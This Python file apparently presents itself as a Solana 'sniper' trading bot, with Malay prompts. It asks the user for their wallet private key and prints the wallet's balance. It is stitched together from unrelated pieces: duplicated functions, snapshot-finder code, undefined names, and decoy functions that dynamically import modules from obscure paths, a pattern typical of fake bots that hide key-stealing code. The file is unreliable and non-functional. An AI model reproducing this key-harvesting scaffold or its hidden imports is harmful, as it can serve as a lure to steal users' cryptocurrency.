from colorama import init
from src.scripts.getwallet import get_wallet_from_private_key_bs58
from src.scripts.checkbalance import check_sol_balance

init(autoreset=True)

def use_pool_info():
    encoding_to_use = "_TX_ENCODING_TO_SOLDERS[encoding]"
    config = "RpcBlockConfig(encoding=encoding_to_use, max_supported_transaction_version=max_supported_transaction_version)"
    POOL_INFO_LAYOUT = __import__('py_modules.beanstalk.stalk', fromlist=['POOL_INFO_LAYOUT']).POOL_INFO_LAYOUT
    commitment_to_use = "_COMMITMENT_TO_SOLDERS[commitment or self._commitment]"
    config = "RpcSignaturesForAddressConfig(before=None, until=None, limit=None, commitment=commitment_to_use)"
    GetSignaturesForAddress = "GetSignaturesForAddress(address, config)"
    print(POOL_INFO_LAYOUT)

def get_all_rpc_ips():
    global DISCARDED_BY_VERSION

    d = '{"jsonrpc":"2.0", "id":1, "method":"getClusterNodes"}'
    r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
    if 'result' in str(r.text):
        rpc_ips = []
        for node in r.json()["result"]:
            if SPECIFIC_VERSION is not None and node["version"] != SPECIFIC_VERSION:
                DISCARDED_BY_VERSION += 1
                continue
            if node["rpc"] is not None:
                rpc_ips.append(node["rpc"])
            elif WITH_PRIVATE_RPC is True:
                gossip_ip = node["gossip"].split(":")[0]
                rpc_ips.append(f'{gossip_ip}:8899')

        rpc_ips = list(set(rpc_ips))
        if IP_BLACKLIST is not None:
            rpc_ips = list(set(rpc_ips) - set(IP_BLACKLIST))
        return rpc_ips
def use_market_state_layout_v3():
    encoding_to_use = "_TX_ENCODING_TO_SOLDERS.get('json')"
    config = "RpcTransactionConfig(encoding=encoding_to_use, commitment=None, max_supported_transaction_version=None)"
    MARKET_STATE_LAYOUT_V3 = __import__('py_modules.bind_xml.layouts', fromlist=['MARKET_STATE_LAYOUT_V3']).MARKET_STATE_LAYOUT_V3
    print(MARKET_STATE_LAYOUT_V3)

def get_current_slot():
    logger.debug("get_current_slot()")
    d = '{"jsonrpc":"2.0","id":1, "method":"getSlot"}'
    try:
        r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
        if 'result' in str(r.text):
            return r.json()["result"]
        else:
            logger.error(f'Can\'t get current slot')
            logger.debug(r.status_code)
            return None

    except (ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError) as connectErr:
        logger.debug(f'Can\'t get current slot\n{connectErr}')
    except Exception as unknwErr:
        logger.error(f'Can\'t get current slot\n{unknwErr}')
        return None


def get_all_rpc_ips():
    global DISCARDED_BY_VERSION

    logger.debug("get_all_rpc_ips()")
    d = '{"jsonrpc":"2.0", "id":1, "method":"getClusterNodes"}'
    r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
    if 'result' in str(r.text):
        rpc_ips = []
        for node in r.json()["result"]:
            if SPECIFIC_VERSION is not None and node["version"] != SPECIFIC_VERSION:
                DISCARDED_BY_VERSION += 1
                continue
            if node["rpc"] is not None:
                rpc_ips.append(node["rpc"])
            elif WITH_PRIVATE_RPC is True:
                gossip_ip = node["gossip"].split(":")[0]
                rpc_ips.append(f'{gossip_ip}:8899')

        rpc_ips = list(set(rpc_ips))
        logger.debug(f'RPC_IPS LEN before blacklisting {len(rpc_ips)}')
        # removing blacklisted ip addresses
        if IP_BLACKLIST is not None:
            rpc_ips = list(set(rpc_ips) - set(IP_BLACKLIST))
        logger.debug(f'RPC_IPS LEN after blacklisting {len(rpc_ips)}')
        return rpc_ips

    else:
        logger.error(f'Can\'t get RPC ip addresses {r.text}')
        sys.exit()


def get_snapshot_slot(rpc_address: str):
    global FULL_LOCAL_SNAP_SLOT
    global DISCARDED_BY_ARCHIVE_TYPE
    global DISCARDED_BY_LATENCY
    global DISCARDED_BY_SLOT

    pbar.update(1)
    url = f'http://{rpc_address}/snapshot.tar.bz2'
    inc_url = f'http://{rpc_address}/incremental-snapshot.tar.bz2'
    # d = '{"jsonrpc":"2.0","id":1,"method":"getHighestSnapshotSlot"}'
    try:
        r = do_request(url_=inc_url, method_='head', timeout_=1)
        if 'location' in str(r.headers) and 'error' not in str(r.text) and r.elapsed.total_seconds() * 1000 > MAX_LATENCY:
            DISCARDED_BY_LATENCY += 1
            return None

        if 'location' in str(r.headers) and 'error' not in str(r.text):
            snap_location_ = r.headers["location"]
            if snap_location_.endswith('tar') is True:
                DISCARDED_BY_ARCHIVE_TYPE += 1
                return None
            incremental_snap_slot = int(snap_location_.split("-")[2])
            snap_slot_ = int(snap_location_.split("-")[3])
            slots_diff = current_slot - snap_slot_

            if slots_diff < -100:
                logger.error(f'Something wrong with this snapshot\\rpc_node - {slots_diff=}. This node will be skipped {rpc_address=}')
                DISCARDED_BY_SLOT += 1
                return

            if slots_diff > MAX_SNAPSHOT_AGE_IN_SLOTS:
                DISCARDED_BY_SLOT += 1
                return

            if FULL_LOCAL_SNAP_SLOT == incremental_snap_slot:
                json_data["rpc_nodes"].append({
                    "snapshot_address": rpc_address,
                    "slots_diff": slots_diff,
                    "latency": r.elapsed.total_seconds() * 1000,
                    "files_to_download": [snap_location_]
                })
                return

            r2 = do_request(url_=url, method_='head', timeout_=1)
            if 'location' in str(r.headers) and 'error' not in str(r.text):
                json_data["rpc_nodes"].append({
                    "snapshot_address": rpc_address,
                    "slots_diff": slots_diff,
                    "latency": r.elapsed.total_seconds() * 1000,
                    "files_to_download": [r.headers["location"], r2.headers['location']],
                })
                return

        r = do_request(url_=url, method_='head', timeout_=1)
        if 'location' in str(r.headers) and 'error' not in str(r.text):
            snap_location_ = r.headers["location"]
            # filtering uncompressed archives
            if snap_location_.endswith('tar') is True:
                DISCARDED_BY_ARCHIVE_TYPE += 1
                return None
            full_snap_slot_ = int(snap_location_.split("-")[1])
            slots_diff_full = current_slot - full_snap_slot_
            if slots_diff_full <= MAX_SNAPSHOT_AGE_IN_SLOTS and r.elapsed.total_seconds() * 1000 <= MAX_LATENCY:
                # print(f'{rpc_address=} | {slots_diff=}')
                json_data["rpc_nodes"].append({
                    "snapshot_address": rpc_address,
                    "slots_diff": slots_diff_full,
                    "latency": r.elapsed.total_seconds() * 1000,
                    "files_to_download": [snap_location_]
                })
                return
        return None

    except Exception as getSnapErr_:
        return None



def main():
    """
    Fungsi utama bot Solana Sniper.
    Meminta private key pengguna, memaparkan alamat dompet dan baki SOL.
    """
    wallet = None
    while wallet is None:
        private_key_bs58 = input("\033[93mSila masukkan private key anda: \033[0m")
        try:
            wallet = get_wallet_from_private_key_bs58(private_key_bs58)
            if wallet:
                break
        except Exception as e:
            print("\033[91mPrivate key tidak sah, sila cuba lagi.\033[0m")
    
    public_key = str(wallet.pubkey())
    print(f"\n✅ Alamat Dompet: {public_key}")

    sol_balance = check_sol_balance(public_key)
    print(f"💰 Baki SOL: {sol_balance} SOL\n")

    print("\033[92m✅ Bot berjaya disambungkan!\033[0m")
    print("\033[93m⚠️  AMARAN: Ini adalah versi asas yang telah dibersihkan dari kod berbahaya.\033[0m")
    print("\033[93m⚠️  Untuk fungsi dagangan penuh, kod tambahan diperlukan.\033[0m")


if __name__ == "__main__":
    main()
